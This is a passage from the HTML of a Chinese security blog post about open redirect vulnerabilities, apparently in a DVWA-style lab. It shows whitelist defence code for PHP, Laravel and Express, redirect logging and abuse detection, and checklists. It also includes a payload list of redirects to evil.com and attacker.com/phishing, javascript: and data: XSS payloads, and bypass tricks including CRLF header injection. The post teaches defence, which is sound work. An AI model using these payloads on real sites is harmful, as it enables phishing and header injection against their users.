class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$redirect</span>&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>

<h3 id="框架层面"><a href="#框架层面" class="headerlink" title="框架层面"></a>框架层面</h3><h4 id="Laravel示例"><a href="#Laravel示例" class="headerlink" title="Laravel示例"></a>Laravel示例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用Laravel的重定向</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/redirect&#x27;</span>, function() &#123;</span><br><span class="line">    <span class="variable">$redirect</span> = <span class="title function_ invoke__">request</span>(<span class="string">&#x27;redirect&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 白名单检查</span></span><br><span class="line">    <span class="variable">$allowed</span> = [</span><br><span class="line">        <span class="title function_ invoke__">route</span>(<span class="string">&#x27;dashboard&#x27;</span>),</span><br><span class="line">        <span class="title function_ invoke__">route</span>(<span class="string">&#x27;profile&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;https://trusted-site.com/page&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$redirect</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">abort</span>(<span class="number">400</span>, <span class="string">&#x27;Invalid redirect&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="variable">$redirect</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或使用intended()方法（Laravel内置安全重定向）</span></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>()-&gt;<span class="title function_ invoke__">intended</span>(<span class="string">&#x27;/dashboard&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="Express-js示例"><a href="#Express-js示例" class="headerlink" title="Express.js示例"></a>Express.js示例</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/redirect&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> redirect = req.<span class="property">query</span>.<span class="property">redirect</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 白名单</span></span><br><span class="line">    <span class="keyword">const</span> allowed = [</span><br><span class="line">        <span class="string">&#x27;/dashboard&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/profile&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;https://trusted-site.com/page&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!allowed.<span class="title function_">includes</span>(redirect)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid redirect&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">redirect</span>(redirect);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="监控层面"><a href="#监控层面" class="headerlink" title="监控层面"></a>监控层面</h3><h4 id="1-记录所有重定向"><a href="#1-记录所有重定向" class="headerlink" title="1. 记录所有重定向"></a>1. 记录所有重定向</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logRedirect</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$target</span>, <span class="variable">$success</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$log</span> = [</span><br><span class="line">        <span class="string">&#x27;timestamp&#x27;</span> =&gt; <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span> =&gt; <span class="variable">$user</span>,</span><br><span class="line">        <span class="string">&#x27;target&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="variable">$success</span>,</span><br><span class="line">        <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(</span><br><span class="line">        <span class="string">&#x27;/var/log/security/redirects.log&#x27;</span>,</span><br><span class="line">        <span class="title function_ invoke__">json_encode</span>(<span class="variable">$log</span>) . <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">        FILE_APPEND</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-检测异常重定向模式"><a href="#2-检测异常重定向模式" class="headerlink" title="2. 检测异常重定向模式"></a>2. 检测异常重定向模式</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检测大量失败的重定向尝试</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">detectRedirectAbuse</span>(<span class="params"><span class="variable">$ip</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$recent_failures</span> = <span class="title function_ invoke__">countRecentFailures</span>(<span class="variable">$ip</span>, <span class="number">300</span>); <span class="comment">// 5分钟</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$recent_failures</span> &gt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertSecurity</span>(<span class="string">&quot;Possible open redirect abuse from <span class="subst">$ip</span>&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">blockIP</span>(<span class="variable">$ip</span>, <span class="number">3600</span>); <span class="comment">// 封禁1小时</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
<thead>
<tr>
<th>特性</th>
<th>Low</th>
<th>Medium</th>
<th>High</th>
<th>Impossible</th>
</tr>
</thead>
<tbody><tr>
<td>URL验证</td>
<td>❌ 无</td>
<td>正则包含</td>
<td>parse_url</td>
<td>严格白名单</td>
</tr>
<tr>
<td>域名检查</td>
<td>❌</td>
<td>弱检查</td>
<td>白名单</td>
<td>严格白名单</td>
</tr>
<tr>
<td>协议检查</td>
<td>❌</td>
<td>http&#x2F;https</td>
<td>http&#x2F;https</td>
<td>http&#x2F;https</td>
</tr>
<tr>
<td>匹配方式</td>
<td>N&#x2F;A</td>
<td>包含匹配</td>
<td>精确匹配</td>
<td>完全匹配</td>
</tr>
<tr>
<td>CSRF防护</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>✅</td>
</tr>
<tr>
<td>审计日志</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>✅</td>
</tr>
<tr>
<td>攻击难度</td>
<td>极易</td>
<td>简单</td>
<td>中等</td>
<td>极难</td>
</tr>
</tbody></table>
<hr>
<h2 id="常用Payload集合"><a href="#常用Payload集合" class="headerlink" title="常用Payload集合"></a>常用Payload集合</h2><h3 id="基础Payload"><a href="#基础Payload" class="headerlink" title="基础Payload"></a>基础Payload</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 外部重定向</span></span><br><span class="line">?<span class="attribute">redirect</span>=https://evil.com</span><br><span class="line">?<span class="attribute">redirect</span>=http://attacker.com/phishing</span><br><span class="line"></span><br><span class="line"><span class="comment"># 协议相对URL</span></span><br><span class="line">?<span class="attribute">redirect</span>=//evil.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># JavaScript协议</span></span><br><span class="line">?<span class="attribute">redirect</span>=javascript:alert(1)</span><br><span class="line">?<span class="attribute">redirect</span>=data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 域名后缀</span></span><br><span class="line">?redirect=http:<span class="regexp">//</span>example.com.evil.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># @符号</span></span><br><span class="line">?redirect=http:<span class="regexp">//</span>example.com@evil.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL参数</span></span><br><span class="line">?redirect=http:<span class="regexp">//</span>evil.com?ref=http:<span class="regexp">//</span>example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fragment</span></span><br><span class="line">?redirect=http:<span class="regexp">//</span>evil.com<span class="comment">#http://example.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反斜杠</span></span><br><span class="line">?redirect=http:<span class="regexp">//</span>example.com\@evil.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL编码</span></span><br><span class="line">?redirect=http:<span class="regexp">//</span>evil.com%<span class="number">3</span>Furl%<span class="number">3</span>Dhttp:<span class="regexp">//</span>example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 换行符</span></span><br><span class="line">?redirect=http:<span class="regexp">//</span>example.com%<span class="number">0</span>D%<span class="number">0</span>ALocation:%<span class="number">20</span>http:<span class="regexp">//</span>evil.com</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>渗透测试清单：</strong></p>
<ol>
<li>✅ 测试是否接受外部URL</li>
<li>✅ 尝试各种协议（http, https, javascript, data）</li>
<li>✅ 测试@符号绕过</li>
<li>✅ 测试域名后缀绕过</li>
<li>✅ 测试URL参数&#x2F;fragment绕过</li>
<li>✅ 测试解析器差异</li>
<li>✅ 检查是否有确认页面</li>
</ol>
<p><strong>防御清单：</strong></p>
<ol>
<li>✅ 使用白名单</li>
<li>✅ 只允许相对路径（如果可能）</li>
<li>✅ 验证协议、域名、端口</li>
<li>✅ 使用ID映射</li>
<li>✅ 添加确认页面（外部跳转）</li>
<li>✅ 记录所有重定向</li>
<li>✅ 实施CSRF防护</li>
</ol>
<p><strong>道德准则：</strong></p>
<ul>
<li>只在授权环境测试</li>
<li>不构造真实钓鱼页面</li>
<li>学习是为了防御开放重定向攻击</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="caixuya"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">caixuya</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">46</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Caixuya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Caixuya" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:214089030@qq.com" title="E-Mail → mailto:214089030@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">粤ICP备20064368号-1 </a>
  </div>

<div class="copyright">
  
  &copy; 2020 – 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">caixuya</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">374k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">5:40</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/undefined/anime.min.js"></script>
  <script src="/undefined/pjax/pjax.min.js"></script>
  <script src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.pack.js"></script>

<script src="/js/utils.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>

<script src="/js/bookmark.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>














    <div id="pjax">
  

  

    </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
